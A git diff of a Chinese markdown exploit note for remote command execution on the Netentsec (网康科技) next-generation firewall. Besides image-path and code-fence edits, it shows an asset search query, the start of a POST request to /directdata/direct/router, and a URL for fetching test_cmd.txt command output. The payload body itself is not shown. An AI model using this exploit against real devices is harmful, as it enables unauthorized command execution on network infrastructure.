@@ -20,11 +20,11 @@ app="网康科技-下一代防火墙"
 
 登录页面如下
 
-![](images/202202162229920.png)
+![](../.gitbook/assets/202202162229920.png)
 
 发送如下请求包
 
-```plain
+```
 ![](C:\Users\47236\Desktop\2.png)POST /directdata/direct/router HTTP/1.1
 Host: XXX.XXX.XXX.XXX
 Connection: close
@@ -42,9 +42,8 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 
 再请求获取命令执行结果
 
-```plain
+```
 http://xxx.xxx.xxx.xxxx/test_cmd.txt
 ```
 
-![](images/202202162229568.png)
-
+![](../.gitbook/assets/202202162229568.png)
